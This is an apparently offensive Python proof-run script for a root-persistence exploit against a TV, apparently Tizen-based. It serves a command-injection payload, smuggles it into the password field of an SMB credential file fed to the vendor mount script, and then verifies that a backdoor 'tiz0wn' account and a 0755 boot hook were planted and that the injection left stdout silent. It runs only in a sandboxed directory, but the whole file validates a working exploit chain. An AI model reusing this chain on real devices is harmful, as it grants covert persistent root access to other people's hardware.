#!/usr/bin/env python3
"""Full offline proof run: serve.py -> payload -> the real pinned sink -> hook.

Exercises the exact live shape without a TV: starts serve.py on loopback,
takes the payload it printed, checks the served body against the hash the
server printed, drives the hash-pinned vendor mount.smb.sh with that payload,
and asserts the account, hook (0755, correct hash), markers and silent stdout.
Then runs the installed hook the way the boot consumer would.

The sink's final `/bin/mount` does not exist on the Mac, so rc 127 with that
error is the expected benign outcome: the injection ran before the mount.

Run: ``python3 private/persist-root/repro/proof_run.py`` (loopback only).
"""

import hashlib, os, re, shutil, socket, subprocess, sys, tempfile, time
from pathlib import Path

P = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(P)); sys.path.insert(0, str(P / "repro"))
import smbpath_payload

TOKEN = "aabbccdd11223344"
PWHASH_RE = re.compile(r"TIZ0WN_PWHASH='([^']+)'")

def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0)); return s.getsockname()[1]

port = free_port()
serve = subprocess.Popen(
    [sys.executable, str(P/"serve.py"), "--bind", "127.0.0.1", "--port", str(port),
     "--password", "proof-pw-1", "--token", TOKEN,
     "--ack", "I-AUTHORIZE-PERSISTENT-ROOT-SETUP"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    env={**os.environ, "PYTHONUNBUFFERED": "1"})
banner = ""
for _ in range(80):
    line = serve.stdout.readline()
    banner += line
    if "payload length" in line: break
    time.sleep(0.05)
payload = re.search(r"\n    (\$\(.*\))\n", banner).group(1)
print("printed payload:", payload)
print("length:", len(payload.encode()))
assert len(payload.encode()) <= 160
body_sha = re.search(r"served sha256:\s+([0-9a-f]{64})", banner).group(1)
print("server printed sha:", body_sha[:16])

root = Path(tempfile.mkdtemp(prefix="proof-"))
for sub in ("etc","opt/etc","opt/usr/home/owner/share/tmp/sdk_tools","tmp","usr/bin"):
    (root/sub).mkdir(parents=True, exist_ok=True)
(root/"etc/passwd").write_text("root:x:0:0:root:/root:/bin/sh\nowner:x:1000:1000:owner:/home/owner:/bin/sh\n", encoding="ascii")
(root/"etc/shadow").write_text("root:*:19000:0:99999:7:::", encoding="ascii")  # no trailing NL

# fetch the body exactly as the TV would, verify the printed hash matches
fetched = subprocess.run(["curl","-fsS",f"http://127.0.0.1:{port}/d"], capture_output=True).stdout
assert hashlib.sha256(fetched).hexdigest() == body_sha, "served body hash mismatch"
print("fetched body hash matches the server's print")

# the body must have the real hash, not a placeholder
hookhash = PWHASH_RE.search(fetched.decode()).group(1)
assert hookhash.startswith("$6$"), hookhash   # the hook template keeps @PWHASH@, the prelude must not
print("body carries a real $6$ hash")

# build the credential file and mount argument exactly as the launcher does
cred = root/"tmp/cred"
cred.write_text(f"username=q60t\npassword={payload}\nsmbpath=\"Q6BENIGN0000\"\n", encoding="ascii")
arg = smbpath_payload.build_mount_argument(host_ip="192.0.2.10", credential_file=str(cred))

env = {"PATH":"/usr/bin:/bin:/usr/sbin:/sbin","debug":"false",
       "TIZ0WN_ROOT":str(root),"TIZ0WN_ASSUME_ROOT":"1"}
r = subprocess.run(["/bin/bash", str(P/"repro/mount.smb.sh"), arg],
                   capture_output=True, text=True, env=env)
print("sink rc:", r.returncode, "| stderr tail:", r.stderr.strip().splitlines()[-1:])
print("stdout (must carry no persist-root text):", repr(r.stdout))

checks = {
 "account created": sum(1 for l in (root/"etc/passwd").read_text().splitlines() if l.split(":")[0]=="tiz0wn") == 1,
 "hook installed": (root/"opt/etc/parseinfo.sh").is_file(),
 "hook 0755": (root/"opt/etc/parseinfo.sh").stat().st_mode & 0o777 == 0o755,
 "hook hash verbatim": hookhash in (root/"opt/etc/parseinfo.sh").read_text(),
 "boot marker": list((root/"opt/usr/home/owner/share/tmp/sdk_tools").glob("tiz0wn-root-*.out")),
 "no FAILED marker": not list((root/"opt/usr/home/owner/share/tmp/sdk_tools").glob("*.FAILED")),
 "stdout silent": "persist-root:" not in r.stdout,
 "shadow not merged": all(len(l.split(":"))==9 for l in (root/"etc/shadow").read_text().splitlines()),
}
for k,v in checks.items(): print(("  OK   " if v else "  FAIL "), k)

# run the installed hook as the boot consumer would
h = subprocess.run(["/bin/sh", str(root/"opt/etc/parseinfo.sh")], capture_output=True, text=True,
                   env={"PATH":"/usr/bin:/bin","TIZ0WN_ROOT":str(root)})
print("hook rc:", h.returncode)
marker = list((root/"opt/usr/home/owner/share/tmp/sdk_tools").glob("tiz0wn-boot-*.out"))
print("boot marker says:", marker[0].read_text().split("\n")[0] if marker else "MISSING")

serve.terminate(); serve.wait(timeout=10)
ok = all(checks.values()) and h.returncode == 0
print("\nPROOF RUN:", "PASS" if ok else "FAIL")
shutil.rmtree(root, ignore_errors=True)
sys.exit(0 if ok else 1)
